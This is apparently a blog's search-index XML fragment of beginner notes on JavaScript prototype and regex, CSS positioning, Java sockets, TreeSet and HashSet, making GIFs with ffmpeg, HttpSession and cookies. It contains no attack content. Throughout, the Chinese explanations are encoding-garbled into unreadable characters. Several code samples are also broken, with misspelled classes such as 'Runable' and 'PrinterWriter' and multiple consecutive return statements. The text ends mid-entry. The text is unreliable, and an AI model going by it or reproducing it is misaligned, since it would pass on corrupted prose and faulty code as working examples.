      <url>/2018/04/27/javascript/</url>
      
        <content type="html"><![CDATA[<p>*<em><em>prototype</em> *</em><br>prototype Â±ûÊÄß‰ΩøÊÇ®ÊúâËÉΩÂäõÂêëÂØπË±°Ê∑ªÂä†Â±ûÊÄßÂíåÊñπÊ≥ï</p><pre><code>var array = [&apos;banner&apos;,&apos;apple&apos;,&apos;orange&apos;];Array.prototype.myUpcase = function(){    for (var i = this.length - 1; i &gt;= 0; i--) {        this[i] = this[i].toUpperCase();    }};array.myUpcase();console.log(array);// [&quot;BANNER&quot;, &quot;APPLE&quot;, &quot;ORANGE&quot;]</code></pre><p>Âú®ÊûÑÂª∫‰∏Ä‰∏™ÊñπÊ≥ïÊó∂ÔºåÊâÄÊúâÁöÑÊï∞ÁªÑÈÉΩÂèØ‰ª•‰ΩøÁî®ËØ•ÊñπÊ≥ï<br>Array.prototype ÂçïÁã¨‰∏çËÉΩÂºïÁî®Êï∞ÁªÑ, Array() ÂØπË±°ÂèØ‰ª•„ÄÇ</p><hr><p>*<em><em>forEach()</em> *</em><br>array.forEach(function(currentValue, index, arr), thisValue)<br>currentValueÔºöÂΩìÂâçÂÄºÔºåÂøÖÈ°ª<br>indexÔºöcurrentValueÂØπÂ∫îÁöÑindexÔºåÂèØÈÄâ<br>arrÔºöÊìç‰ΩúÁöÑËøô‰∏™arrayËøô‰∏™Êï∞ÁªÑÔºåÂèØÈÄâ</p><pre><code>var array = [3,2,3,4,5];array.forEach(fn);function fn(item,index,arr){    console.log(&quot;array[&quot;+index+&quot;] : &quot;+item);};/*array.forEach(function(item,index,arr{console.log(&quot;array[&quot;+index+&quot;] : &quot;+item);});//‰πüÂèØ‰ª•ÂÜôÊàêËøôÊ†∑ÔºåÊÑüËßâjavaÂíåjsÂáΩÊï∞ÁöÑÂèÇÊï∞Âæà‰∏ç‰∏ÄÊ†∑*/</code></pre><hr><p>DateÔºàÔºâÂØπË±°</p><pre><code>var date = new Date();var timeStr = date.getFullYear()+&quot; : &quot;+date.getHours()+&quot; : &quot;+date.getMinutes();console.log(timeStr);//2018 : 19 : 2</code></pre><p>*<em><em>regex</em> *</em><br><em>‰øÆÈ•∞Á¨¶</em></p><pre><code>iÔºöÂØπÂ§ßÂ∞è‰∏çÊïèÊÑüÁöÑÂåπÈÖçgÔºöÊâßË°åÂÖ®Â±ÄÂåπÈÖçÔºåÔºà‰∏çÊòØÊâßË°å‰∏ÄÊ¨°ÂåπÈÖçÂêéÂÅúÊ≠¢ÔºâmÔºöÊâßË°åÂ§öË°åÂåπÈÖç</code></pre><p>/i</p><pre><code>var str = &quot;Visist RUnoob&quot;;var patt1 = /runoob/i;console.log(str.match(patt1));//&quot;RUnoob&quot;</code></pre><p>/g</p><pre><code>var str=&quot;Is this all there is?&quot;;var patt1=/is/g;alert(str.match(patt1));//is,ispatt1 = /is/;alert(str.match(patt1));//is</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> ÂÆûËÆ≠ </tag>
            
            <tag> js </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>css position</title>
      <link href="/2018/04/26/css%20position/"/>
      <url>/2018/04/26/css%20position/</url>
      
        <content type="html"><![CDATA[<pre><code>/**   static   relative  Áõ∏ÂØπÂ∏ÉÂ±Ä      Áõ∏ÂØπÁöÑÊòØËá™Â∑±ÂéüÊù•ÊâÄÂú®ÁöÑ‰ΩçÁΩÆ      ‰æùÁÑ∂Âç†ÊúâËá™Â∑±ÂéüÊù•ÁöÑ‰ΩçÁΩÆ   absolute  ÁªùÂ∫¶Â∏ÉÂ±Ä      ‰ºöËÑ±Á¶ªÊñáÊ°£ÊµÅ      ÂΩìÁà∂ÂÖÉÁ¥†ËøõË°å‰∫ÜÂÆö‰ΩçÊó∂ÔºåÁõ∏ÂØπÁöÑÊòØÁà∂ÂÖÉÁ¥†ÁöÑ‰ΩçÁΩÆ      Ëã•Áà∂ÂÖÉÁ¥†Ê≤°ÊúâËøõË°åÂÆö‰ΩçÔºåÁõ∏ÂØπÁöÑÊòØbodyÂÖÉÁ¥†   fixed     Âõ∫ÂÆöÂ∏ÉÂ±Ä      ‰ºöËÑ±Á¶ªÊñáÊ°£ÊµÅ      Áõ∏ÂØπ‰∫éÁ™óÂè£ËøõË°åÂÆö‰Ωç*/</code></pre><hr><p>‰∏ãÈù¢‰∏ªË¶ÅÁ†îÁ©∂absolute</p><pre><code>&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;title&gt;Document&lt;/title&gt;    &lt;style type=&quot;text/css&quot;&gt;        .father{            width: 300px;            height:200px;            background-color: blue;            /*position: relative;*/        }        .son{            width: 100%;            height: 100%;            position: absolute;            background-color: red;        }    &lt;/style&gt;&lt;/head&gt;&lt;body&gt;    &lt;div class=&quot;father&quot;&gt;        &lt;div class = &quot;son&quot;&gt;&lt;/div&gt;    &lt;/div&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>ÂèØ‰ª•ÂèëÁé∞ÔºåËøô‰∏™class<br>sonÔºåÂú®father‰∏ãÈù¢ÔºåsonÁöÑposition‰∏∫absoluteÔºå‰ΩÜÊòØfatherÊ≤°ÊúâÂÜôÔºåÊâÄ‰ª•ÔºåsonÁöÑwidthÔºö100%ÔºåheightÔºö100%‰ºöÂ∏ÉÊª°Êï¥‰∏™body„ÄÇ<br>‰ΩÜÊòØÔºåÂ∞ÜfatherÈáåÈù¢ÁöÑpositionÊîπ‰∏∫relativeÔºåsonÁöÑwidthÔºö100%ÔºåheightÔºö100%Â∞±‰ºöÂè™Â∏ÉÊª°fatherËøô‰∏™widthÔºö300pxÔºåheightÔºö200pxÔºõ</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>java ÁÆÄÂçïsocketÈÄö‰ø°</title>
      <link href="/2018/04/19/java%20%E7%AE%80%E5%8D%95socket%E9%80%9A%E4%BF%A1/"/>
      <url>/2018/04/19/java%20%E7%AE%80%E5%8D%95socket%E9%80%9A%E4%BF%A1/</url>
      
        <content type="html"><![CDATA[<p>TCPServer</p><pre><code>ServerSocket ss = new ServerSocket(port);//ÂàõÂª∫‰ª•serverËøêË°åÁöÑÊú∫Âô®ÁöÑlocahostÔºöportÁöÑÊúçÂä°Âô®/**ÈÄöËøáss.accept(),ÈòªÂ°ûÂºèÊé•Êî∂ËøûÊé•Âà∞ÊúçÂä°Âô®ÁöÑsocketÔºåÂπ∂ÂàõÂª∫‰∏Ä‰∏™Á∫øÁ®ãÊù•ÁõëÂê¨Ëøô‰∏™socket*/while(true){    Socket s = ss.accept();    new Thread(new ServerTask(s)).start();}</code></pre><p>ServerTaskÔºöË∞ÉÁî®RunableÊé•Âè£,</p><pre><code>public Class ServerTask implements Runable{     private Socket s;    public ServerTask(Socket s){//Â∞ÜÁõëÂê¨ÁöÑsocketËµãÁªôs        this.s = s;    }    @Override    public void run() {//ÁõëÂê¨socketÁöÑËæìÂÖ•ËæìÂá∫ÊµÅ        InputStream is = s.getInputStream();//socket-&gt;server        OutputStream os = s.getOutputStream();//server -&gt;socket        Scanner sc = null;        PrinterWriter pw = null;        try {            sc = new Scanner(is);            pw = new PrinterWriter(os);        } catch (IOException e) {            e.printStackTrace();        }        while(true) {            String data = sc.nextLine();//ÈòªÂ°ûÂºèÁõëÂê¨ÔºåÊòØÂê¶Êé•Êî∂Âà∞socketÂèëÊù•Êï∞ÊçÆ            System.out.println(data);            pw.println(&quot;xxxxxx&quot;);//Êé•Êî∂Âà∞dataÂêéÔºåÂÜçËøîÂõû‰ø°ÊÅØxxxxxÁªôsocket            pw.flush();        }    }}</code></pre><p>client</p><pre><code>public class Client {    public static void main(String[] args) throws IOException{        Socket s = new Socket(&quot;127.0.0.1&quot;,8888);//ÂàõÂª∫socketÔºåËøûÊé•ÊúçÂä°Âô®Ôºå127.0.0.1:8888        new Thread(new WriteTask(s)).start();//ÂàõÂª∫Á∫øÁ®ãÂØπsocketÁöÑÂÜôÊï∞ÊçÆÊµÅÁõëÂê¨   socket-„Äãserver        new Thread(new ReadTask(s)).start();//ÂàõÂª∫Á∫øÁ®ãÂØπsocketÁöÑËØªÊï∞ÊçÆÊµÅÁõëÂê¨  server - „Äãsocket}</code></pre><p>WriteTask</p><pre><code>public class WriteTask implements Runnable {    private Socket s;    public WriteTask(Socket s){        this.s = s;    }    @Override    public void run() {        PrintWriter printWriter = null;        try {            printWriter = new PrintWriter(s.getOutputStream());        } catch (IOException e) {            e.printStackTrace();        }        Scanner sc = new Scanner(System.in);        while(true){//ÈòªÂ°ûÂºèÂà§Êñ≠ÁªàÁ´ØÊòØÂê¶ÊúâËæìÂÖ•            String message = sc.nextLine();            printWriter.println(message);//socket-&gt;server            printWriter.flush();        }}</code></pre><p>ReadTask</p><pre><code>InputStream is = s.getInputStream();Scanner sc = new Scanner(is);while(true){//ÈòªÂ°ûÂºèÂà§Êñ≠ÊòØÂê¶ÊúâËæìÂÖ•    String message = sc.nextLine();//Server-&gt;socket    System.out.println(message);}</code></pre><hr><p>ÊÄªÁªìÔºö<br>1.ÊúçÂä°Âô®while<br>trueÔºåÈòªÂ°ûÊé•Êî∂socketÔºåÊé•Âà∞ÂêéÔºåÂØπsocket‰∏ìÈó®ÂàõÂª∫Á∫øÁ®ãËøõË°åÁõëÂê¨ÔºåÁÑ∂ÂêéÂØπsocketÊé•Êî∂ËØ∑Ê±ÇÔºåÊ†πÊçÆËØ∑Ê±ÇÔºåÊúçÂä°Âô®ËøîÂõûresponse<br>2.client ÂàõÂª∫socket 1.clientÂÜôÊï∞ÊçÆÔºåÂØπserverÂèëÈÄÅrequestÔºå2.ÂàõÂª∫Á∫øÁ®ãÔºåÂØπÊúçÂä°Âô®ÁöÑreponseËøõË°åÊé•Êî∂<br>3.PrinterWriterÊòØÂØπoutputStreamÁöÑÂ∞ÅË£ÖÔºå<br>ScannerÊòØÂØπinputStreamÂ∞ÅË£ÖÔºåÂè™ÊòØÂæàÊñπ‰æøÊñáÂ≠ó‰º†ËæìÔºå‰ΩÜÊòØË¶ÅÊòØ‰º†ËæìÂõæÁâáÊàñËÄÖobjectÊó∂ ‚Ä¶‚Ä¶.Â∞±‰ºöÊä•ÈîôÔºåÊâÄ‰ª•ÔºåÈÄâÊã©ÂêàÈÄÇÁöÑÊµÅÊòØÂæàÈáçË¶ÅÁöÑ<br>4.Êàë‰∏äËø∞ÁöÑ‰ª£Á†ÅÊòØÁÆÄË¶ÅÁâà</p>]]></content>
      
      
      
        <tags>
            
            <tag> ÂÆûËÆ≠ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TreeSetÂíåHashSet ÂéªÈô§ÈáçÂ§çÊï∞ÊçÆÁöÑ‰∏çÂêå</title>
      <link href="/2018/03/27/TreeSet%E5%92%8CHashSet%20%E5%8E%BB%E9%99%A4%E9%87%8D%E5%A4%8D%E6%95%B0%E6%8D%AE%E7%9A%84%E4%B8%8D%E5%90%8C/"/>
      <url>/2018/03/27/TreeSet%E5%92%8CHashSet%20%E5%8E%BB%E9%99%A4%E9%87%8D%E5%A4%8D%E6%95%B0%E6%8D%AE%E7%9A%84%E4%B8%8D%E5%90%8C/</url>
      
        <content type="html"><![CDATA[<p><strong>TreeSetÂéªÈáç</strong><br>È¶ñÂÖàTreeSetÂèØ‰ª•ÂÆûÁé∞ÊéíÂ∫è</p><pre><code>    @org.junit.Test    public void testHashSet() {        Person person = new Person(&quot;1&quot;,1,1);        Person person1 = new Person(&quot;1&quot;,1,2);        Person person2 = new Person(&quot;2&quot;,1,2);        TreeSet&lt;Person&gt; treeSet = new TreeSet&lt;&gt;(new Comparator&lt;Person&gt;() {            @Override            public int compare(Person o1, Person o2) {                if(o1.getName().equals(o2.getName())){                    return 0;                }                if(o1.getAge() &gt; o2.getAge()){                    return 1;                }else {                    return -1;                }            }        });    }    /**public Person(String name, int age,int money) {        this.name = name;        this.age = age;        this.money = money;    }    ËøôÊòØPersonÁ±ªÁöÑÊûÑÈÄ†Âô®*/</code></pre><p>Âú®treeSetÂàõÂª∫ÁöÑÊó∂ÂÄôÔºåÈáçÂÜô‰∫Ü‰ª•‰∏ã‰ª£Á†Å<br>1.</p><pre><code>TreeSet&lt;Person&gt; treeSet = new TreeSet&lt;&gt;(new Comparator&lt;Person&gt;() {            @Override            public int compare(Person o1, Person o2) {                return 0;//Person o1Áïô‰∏ãÔºåo2Ê∑ªÂä†Â§±Ë¥•                return -1;//ÂÄíÂ∫èÂ≠òÂÇ®                return 1;//ÂçáÂ∫èÂ≠òÂÇ®            }        });</code></pre><p><strong>Ëøô‰∏™ÊñπÊ≥ï‰∏≠Ôºåreturn 0ÔºõÊòØÊó†Ê≥ïÊ∑ªÂä†ÁöÑ</strong><br>2.ÂΩìÁÑ∂‰πüÂèØ‰ª•Âú®PersonÁ±ª‰∏≠ÂÆûÁé∞comparableÊé•Âè£ÔºåÈáçÂÜôÊé•Âè£‰∏≠ÁöÑcompareToÊñπÊ≥ïÔºåÂÖ∑‰ΩìÂÆûÁé∞Âíå‰∏äÈù¢ÁöÑÊñπÊ≥ïÊ≤°ÊúâÂ§™Â§ßÂå∫Âà´</p><hr><p><strong>HashSet</strong><br>HashSetÊòØÈÄöËøáHashMapÂÆûÁé∞ÁöÑÔºå<br>hashCodeÔºàÔºâÂíåequals()ÊòØHashMapÁî®ÁöÑ, Âõ†‰∏∫Êó†ÈúÄÊéíÂ∫èÊâÄ‰ª•Âè™ÈúÄË¶ÅÂÖ≥Ê≥®ÂÆö‰ΩçÂíåÂîØ‰∏ÄÊÄßÂç≥ÂèØ<br>‰øÆÊîπPersonÁ±ª‰∏≠ÁöÑhashCodeÔºàÔºâÂíåequalsÔºàÔºâÊñπÊ≥ïÔºå‰∏§‰∏™ÈÉΩË¶Å‰øÆÊîπ</p>]]></content>
      
      
      
        <tags>
            
            <tag> ÂÆûËÆ≠ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>‰∏∫ÊâÄÊ¨≤‰∏∫gifÂà∂‰Ωú</title>
      <link href="/2018/03/20/%E4%B8%BA%E6%89%80%E6%AC%B2%E4%B8%BAgif%E5%88%B6%E4%BD%9C/"/>
      <url>/2018/03/20/%E4%B8%BA%E6%89%80%E6%AC%B2%E4%B8%BAgif%E5%88%B6%E4%BD%9C/</url>
      
        <content type="html"><![CDATA[<p><strong>ÂÖ∑‰ΩìÂéüÁêÜ‰∏çÁü•ÔºåËÄå‰∏î‰ª£Á†ÅÂÜôÁöÑÂæàÊãôÂä£ÔºåÂè™ÊòØÁé©‰∏ÄÁé©</strong><br>Êú¨ÂçöÂÆ¢ÊòØÊ®°‰ªø‰ª•‰∏äÂ§ß‰Ω¨ÁöÑ‰ª£Á†Å<br><a href="https://github.com/xtyxtyx/sorry" target="_blank" rel="noopener"> ÁªºÂêàÁâàÔºåubuntu+ruby </a><br>ÂÖ∂ÂÆûÊàëÊòØÁúãÂè¶‰∏Ä‰∏™Â§ß‰Ω¨ÁöÑ‰ª£Á†Å <a href="https://github.com/East196/sorrypy" target="_blank" rel="noopener"> ubuntu+pythonÁâà </a><br>Âè™ÊòØÂÆûÁé∞‰∫ÜgifÂà∂‰Ωú</p><p>step1Ôºö<br>Â¶Ç‰Ωï‰∏∫ËßÜÈ¢ëÂä†Â≠óÂπï <a href="https://mooc.guokr.com/post/506770/" target="_blank" rel="noopener"> AegisubÂ≠óÂπïÊïôÂ≠¶ </a><br>step2Ôºö<br>Á†îÁ©∂AegisubÁöÑÂ≠óÂπï.assÊñá‰ª∂</p><pre><code>Ôªø[Script Info]; Script generated by Aegisub 3.2.2; http://www.aegisub.org/Title: Default Aegisub fileScriptType: v4.00+WrapStyle: 0ScaledBorderAndShadow: yesYCbCr Matrix: None[Aegisub Project Garbage]Audio File: C:/Users/Administrator/Desktop/sorrypy-master/static/sorry/template.mp4Video File: C:/Users/Administrator/Desktop/sorrypy-master/static/sorry/template.mp4Video AR Mode: 4Video AR Value: 1.781250Active Line: 8Video Position: 411[V4+ Styles]Format: Name, Fontname, Fontsize, PrimaryColour, SecondaryColour, OutlineColour, BackColour, Bold, Italic, Underline, StrikeOut, ScaleX, ScaleY, Spacing, Angle, BorderStyle, Outline, Shadow, Alignment, MarginL, MarginR, MarginV, EncodingStyle: Default,Arial,20,&amp;H00FFFFFF,&amp;H000000FF,&amp;H00000000,&amp;H00000000,0,0,0,0,100,100,0,0,1,2,2,2,10,10,10,1[Events]Format: Layer, Start, End, Style, Name, MarginL, MarginR, MarginV, Effect, TextDialogue: 0,0:00:00.00,0:00:06.87,Default,,0,0,0,,Â•ΩÔºåÂà´ËØ¥ÊàëÊòØÁßªÈô§ËÅîÁõüÁöÑDialogue: 0,0:00:05.00,0:00:07.02,Default,,0,0,0,,Â∞±ÁÆó‰Ω†ÊÉ≥ËØ¨ÂëäÊàëDialogue: 0,0:00:07.02,0:00:09.62,Default,,0,0,0,,ÊàëÊúâÁöÑÊòØÈí±ËÆ©ÂæãÂ∏àÂ∏ÆÊàëÊâìÂÆòÂè∏Dialogue: 0,0:00:09.62,0:00:11.22,Default,,0,0,0,,ÊàëÊÉ≥ÊàëÊ†πÊú¨‰∏çÁî®ÂùêÁâ¢Dialogue: 0,0:00:11.22,0:00:12.72,Default,,0,0,0,,‰Ω†Âà´‰ª•‰∏∫ÊúâÈí±‰∫Ü‰∏çËµ∑ÂïäDialogue: 0,0:00:12.72,0:00:15.62,Default,,0,0,0,,sorryÔºåÊúâÈí±ÁúüÁöÑ‰∫Ü‰∏çËµ∑Dialogue: 0,0:00:15.62,0:00:19.62,Default,,0,0,0,,‰∏çËøáÊàëÊÉ≥‰Ω†‰∏ç‰ºöÊòéÁôΩËøôÁßçÊÑüËßâDialogue: 0,0:00:19.62,0:00:21.62,Default,,0,0,0,,‰∏çÊòéÁôΩDialogue: 0,0:00:21.62,0:00:23.62,Default,,0,0,0,,</code></pre><p>Âú®ÊúÄ‰∏ãÈù¢ÊòØÂ≠óÂπïÁöÑstartTimeÂíåendTimeÔºåÊúÄÂêéÈù¢ÊòØÂ≠óÂπïÂÜÖÂÆπ<br>step3Ôºö<br>Â¶Ç‰ΩïÂà∂‰ΩúÂ±û‰∫éËá™Â∑±ÁöÑgifÔºåÂΩìÁÑ∂Ë¶ÅÁî®Âà∞ <a href="https://www.jianshu.com/p/7ed3be01228b" target="_blank" rel="noopener"> ffmepg </a><br>ÂÖ∑‰ΩìÂéüÁêÜÊàë‰πü‰∏çÁü•ÈÅì</p><hr><pre><code>    È¶ñÂÖà‰∏ãËΩΩffmepgsudo add-apt-repository ppa:kirillshkrogalev/ffmpeg-next sudo apt-get update sudo apt-get install ffmpeg</code></pre><p>ÂÆâË£ÖÂ•ΩÂêé<br>ÁªàÁ´Ø‰∏≠ËøêË°å‰∏ãÈù¢ËøôÂè•ËØùÔºåÂ§ßÊ¶ÇÊòØÊÑèÊÄùÂ∞ÜËßÜÈ¢ëÈôÑÂä†Â≠óÂπïËΩ¨Êç¢Êàêgif<br>ËøêË°åËøôÂè•ËØùÔºåÈúÄË¶ÅÊúâ‰ª•‰∏ãÂÖÉÁ¥†input.mp4,text2.ass</p><pre><code>ffmpeg -i input.mp4 -r 8 -vf ass=text2.ass,scale=300:-1 -y sorry.gif</code></pre><p>input.mp4ÊòØÂàöÂàöÁöÑ‰∏∫ÊâÄÊ¨≤‰∏∫ÁöÑËßÜÈ¢ëÔºåtext2.assÂ∞±ÊòØ‰∏Ä‰∏™Â∞èÈáçÁÇπ‰∫ÜÔºåÂõ†‰∏∫Êàë‰ª¨Ë¶Å‰øÆÊîπ‰ªñÁöÑÂÜÖÈÉ®Â≠óÂπï<br>step4Ôºö</p><hr><p><strong>‰øÆÊîπÂ≠óÂπï</strong><br>È¶ñÂÖàÔºå‰Ω†Ë¶ÅËá™Â∑±ÂÅö‰∏Ä‰∏™Â≠óÂπïÔºåÂæóÂà∞ËßÜÈ¢ë‰∏≠ÊØè‰∏ÄÂè•ËØùÁöÑstartTimeÂíåendTimeÔºåËøôÊ†∑ÊâçËÉΩÂØπÁöÑ‰∏äÂò¥ÂûãÔºåËÆ©‰∫∫Áúãgif‰∏çËá≥‰∫éÂ§™ÂÅá</p><pre><code>#coding:utf-8 ## import re# oldFile = open(&quot;sorry.ass&quot;,&quot;r&quot;)## context = oldFile.read()# # print context# # print &apos;finish&apos;# # print &quot;\n\n&quot;## newContext = re.sub(r&apos;0,,(.*?)\n&apos;,&apos;0,,{sentence}\n&apos;,context)# newFile = open(&quot;test.ass&quot;,&apos;w&apos;)# newFile.write(newContext)# newFile.close()# ‰ª•‰∏äÊòØÂ∞ÜÊï∞ÊçÆÊõøÊç¢Êàê{sentence}# file = open(&apos;test.ass&apos;,&apos;rb&apos;)# file2 = open(&apos;text2.ass&apos;,&apos;w&apos;)# lines = file.readlines()# sentences = [&apos;1&apos;,&apos;2&apos;,&apos;3&apos;,&apos;4&apos;,&apos;5&apos;,&apos;6&apos;,&apos;7&apos;,&apos;8&apos;,&apos;9&apos;]# i = 0# for line in lines:#     if &apos;{sentence}&apos; in line:#         line = line.replace(&apos;{sentence}&apos;,sentences[i])#         i += 1#     print line#     file2.write(line)#‰ª•‰∏äÂÆûÁé∞ÁöÑÂ∞ÜsentenceÊç¢ÊàêÂØπÂ∫îÁöÑÂ≠óÂπï</code></pre><p>ÂéüÁêÜÔºöÂ∞ÜËá™Â∑±ÂæóÂà∞ÁöÑsorry.assËøõË°åÊ≠£ÂàôÂåπÈÖçÔºåÂ∞ÜÂ≠óÂπïÂÜÖÂÆπÈÉΩÁî®{sentence}ÊõøÊç¢<br>ÔºåÁÑ∂ÂêéÂÜçÈÄöËøáÔºåÂ∞ÜÊÉ≥ÊîπÁöÑÂ≠óÂπï‰æùÊ¨°Â°´ÂÖ•sentencesËøô‰∏™listÔºåÊúÄÂêéÈÅçÂéÜÂÜçÂ∞Ü{sentence}ÊõøÊç¢Êéâ„ÄÇ</p><hr><p>ÊúÄÂêéËøô‰ª£Á†ÅÂèØ‰ª•‰∏çÁúã</p><p><code>from subprocess import Popen,PIPE  ass_path = &#39;text2.ass&#39;  gif_path = &#39;sorry.gif&#39;  video_path = &#39;input.mp4&#39;  cmd = &quot;ffmpeg -i {video_path} -r 8 -vf ass={ass_path},scale=300:-1 -y{gif_path}&quot; \  .format(video_path=video_path, ass_path=ass_path, gif_path=gif_path)  print(cmd)  p = Popen(cmd,shell=True,stdout=PIPE,stderr=PIPE)  p.wait()  if p.returncode==-1:  print(&quot;error&quot;)</code> *<em>ÂÖ∑‰ΩìÊ∫ê‰ª£Á†Å<a href="https://github.com/pompeii666/mp4ToGif" target="_blank" rel="noopener"> https://github.com/pompeii666/mp4ToGif</a> *</em></p>]]></content>
      
      
      
        <tags>
            
            <tag> ÁîüÊ¥ª </tag>
            
            <tag> python </tag>
            
            <tag> ÊêûÁ¨ë </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HttpSession</title>
      <link href="/2017/12/14/HttpSession/"/>
      <url>/2017/12/14/HttpSession/</url>
      
        <content type="html"><![CDATA[<p><strong>HttpSessionÁ±ª</strong></p><pre><code>/**1ÔºâÂàõÂª∫ÊàñÂæóÂà∞sessionHttpSession getSession()HttpSession getSession(boolean create)2)ËÆæÁΩÆsessionÂØπË±°void setMaxInactiveInterval(int interval):ËÆæÁΩÆsessionÁöÑÊúâÊïàÊó∂Èó¥void invalidate():ÈîÄÊØÅsessionÂØπË±°java.lang.String getId() :ÂæóÂà∞sessionÁºñÂè∑3Ôºâ‰øùÂ≠ò‰ºöËØùÊï∞ÊçÆÂà∞sessionÂØπË±°void setAttribute(java.lang.String name,java.lang.Object value):‰øùÂ≠òÊï∞ÊçÆjava.lang.Object getAttribute(java.lang.String name):Ëé∑ÂèñÊï∞ÊçÆvoid removeAttribute(java.lang.String name):Ê∏ÖÈô§Êï∞ÊçÆ*/</code></pre><hr><p><strong>SessionÂéüÁêÜ</strong></p><pre><code>/**ÈóÆÈ¢òÔºöÊúçÂä°Âô®ËÉΩÂ§üËØÜÂà´‰∏çÂêåÁöÑÊµèËßàËÄÖ‰ª£Á†ÅËß£ËØªÔºöHttpSession seesion = request.getSession();1ÔºâÁ¨¨‰∏ÄÊ¨°ËÆøÈóÆÂàõÂª∫sessionÂØπË±°ÔºåÁªôsessionÂØπË±°ÂàÜÈÖç‰∏Ä‰∏™ÂîØ‰∏ÄÁöÑidÔºåÂè´JSESSIONID  newHttpSession()2)ÊääJSESSIONID‰Ωú‰∏∫CookieÁöÑÂÄºÂèëÈÄÅÁªôÊµèËßàÂô®‰øùÂ≠òCookie cookie = new Cookie(&quot;JSESSIONID&quot;,sessionID);response.addCookie(cookie);3)Á¨¨‰∫åÊ¨°ËÆøÈóÆÁöÑÊó∂ÂÄôÔºåÊµèËßàÂô®Â∏¶ÁùÄJESSIONIDÁöÑcookieËÆøÈóÆÊúçÂä°Âô®4)ÊúçÂä°Âô®ÂæóÂà∞JSESSIONIDÔºåÂú®ÊúçÂä°Âô®ÁöÑÂÜÖÂ≠ò‰∏≠ÊêúÁ¥¢ÊòØÂê¶Â≠òÊîæÂØπÂ∫îÁºñÂè∑ÁöÑsessionÂØπË±°„ÄÇ    if(ÊâæÂà∞){        return map.get(sessionID);    }    Map&lt;String,HttpSession&gt;5)Â¶ÇÊûúÊâæÂà∞ÂØπÂ∫îÁºñÂè∑ÁöÑsessionÂØπË±°ÔºåÁõ¥Êé•ËøîÂõûËØ•ÂØπË±°6ÔºâÂ¶ÇÊûúÊâæ‰∏çÂà∞ÂØπÂ∫îÁºñÂè∑ÁöÑsessionÂØπË±°ÔºåÂàõÂª∫Êñ∞ÁöÑsessionÂØπË±°ÔºåÁªßÁª≠Ëµ∞1ÁöÑÊµÅÁ®ãÁªìËÆ∫ÔºöÈÄöËøáJSEESIONIDÁöÑcookieÂÄºÂú®ÊúçÂä°Âô®ÊâæsessionÂØπË±°ÔºÅÔºÅÔºÅÔºÅ*/</code></pre><p><strong>SessionÁªÜËäÇ</strong></p><pre><code>1)java.lang.String getId() :ÂæóÂà∞sessionÁºñÂè∑2Ôºâ‰∏§‰∏™getSessionÊñπÊ≥ïÔºö    getSession(true)/getSession() : ÂàõÂª∫ÊàñÂæóÂà∞sessionÂØπË±°„ÄÇÊ≤°ÊúâÂåπÈÖçÁöÑsessionÁºñÂè∑ÔºåÂàõÂª∫Êñ∞ÁöÑsessionÂØπË±°„ÄÇ3)void setMaxInactiveInterval(int interval):ËÆæÁΩÆsessionÁöÑÊúâÊïàÊó∂Èó¥    sessionÂØπË±°ÈîÄÊØÅÊó∂Èó¥Ôºö        3.1ÈªòËÆ§ÊÉÖÂÜµ30ÂàÜÊúçÂä°Âô®Ëá™Âä®ÂõûÊî∂        3.2‰øÆÊîπsessionÂõûÊî∂Êó∂Èó¥        3.3ÂÖ®Â±Ä‰øÆÊîπsessionÊúâÊïàÊó∂Èó¥    &lt;!--‰øÆÊîπsessionÂÖ®Â±ÄÊúâÊïàÊó∂Èó¥ÔºöÂàÜÈíü--&gt;        &lt;session-config&gt;            &lt;session-timeout&gt;1&lt;/session-timeout&gt;        &lt;/session-config&gt;        3.4ÊâãÂä®ÈîÄÊØÅsessionÂØπË±°        void invalidate() :ÈîÄÊØÅsessionÂØπË±°4ÔºâÂ¶Ç‰ΩïÈÅøÂÖçÊµèËßàÂô®ÁöÑJSESSIONIDÁöÑcookieÈöèÁùÄÊµèËßàÂô®ÂÖ≥Èó≠ËÄå‰∏¢Â§±ÁöÑÈóÆÈ¢òCookie c = new Cookie(&quot;JSESSIONID&quot;,session.getID());c.setMaxAge(60*60);response.addCookie(c);</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> session </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>cookie</title>
      <link href="/2017/12/08/cookie/"/>
      <url>/2017/12/08/cookie/</url>
      
        <content type="html"><![CDATA[<p>‰ºöËØùÊäÄÊúØ<br>CookieÊäÄÊúØÔºö‰ºöËØùÊï∞ÊçÆ‰øùÂ≠òÂú®ÊµèËßàÂô®ÂÆ¢Êà∑Á´Ø<br>SessionÊäÄÊúØÔºö‰ºöËØùÊï∞ÊçÆ‰øùÂ≠òÂú®ÊúçÂä°Âô®Á´Ø</p><p>CookieÁ±ªÔºöÁî®‰∫éÂ≠òÂÇ®‰ºöËØùÊï∞ÊçÆ<br>1ÔºâÊûÑÈÄ†CookieÂØπË±°<br>Cookie(java.lang.String name,java.lang.String value)<br>2)ËÆæÁΩÆcookie<br>void setPathÔºàjava.lang.String uriÔºâ:ËÆæÁΩÆcookieÁöÑÊúâÊïàËÆøÈóÆË∑ØÂæÑ<br>void setMaxAge(int expiry)ÔºöËÆæÁΩÆcookieÁöÑÊúâÊïàÊó∂Èó¥<br>void setValueÔºàjava.lang.String newValue newValueÔºâ:ËÆæÁΩÆcookieÁöÑÂÄº<br>3ÔºâÂèëÈÄÅcookieÂà∞ÊµèËßàÂô®‰øùÂ≠ò<br>void response.addCookie(Cookie cookie):ÂèëÈÄÅcookie<br>4ÔºâÊúçÂä°Êé•Êî∂cookie<br>Cookie[] request.getCookies():Êé•Êî∂cookie</p><p>3.3CookieÂéüÁêÜ<br>1ÔºâÊúçÂä°Âô®ÂàõÂª∫cookieÂØπË±°ÔºåÊää‰ºöËØùÊï∞ÊçÆÂ≠òÂÇ®Âà∞cookieÂØπË±°‰∏≠<br>new 